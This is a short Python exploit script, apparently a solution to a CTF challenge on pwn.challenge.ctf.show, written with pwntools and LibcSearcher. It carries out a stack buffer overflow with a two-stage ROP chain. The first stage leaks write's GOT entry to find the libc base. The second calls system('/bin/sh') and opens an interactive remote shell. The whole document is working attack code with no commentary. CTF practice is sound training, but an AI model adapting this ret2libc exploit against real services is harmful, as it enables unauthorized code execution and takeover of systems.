from pwn import *
from LibcSearcher import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28286)
elf = ELF('pwn2')
write_plt = elf.plt['write']
write_got = elf.got['write']
main = elf.sym['main']
pop_rdi = 0x400803 # 0x0000000000400803 : pop rdi ; ret
pop_rsi_r15 = 0x400801 # 0x0000000000400801 : pop rsi ; pop r15 ; ret
payload = cyclic(0x70+8) + p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(write_got) + p64(0)
payload += p64(write_plt)
payload += p64(main)
io.sendlineafter("O.o?",payload)
write = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print(hex(write))
libc = LibcSearcher('write',write)
libc_base = write - libc.dump('write')
system = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')
payload = cyclic(0x70+8) + p64(pop_rdi) + p64(bin_sh) + p64(system)
io.sendlineafter("O.o?",payload)
io.interactive()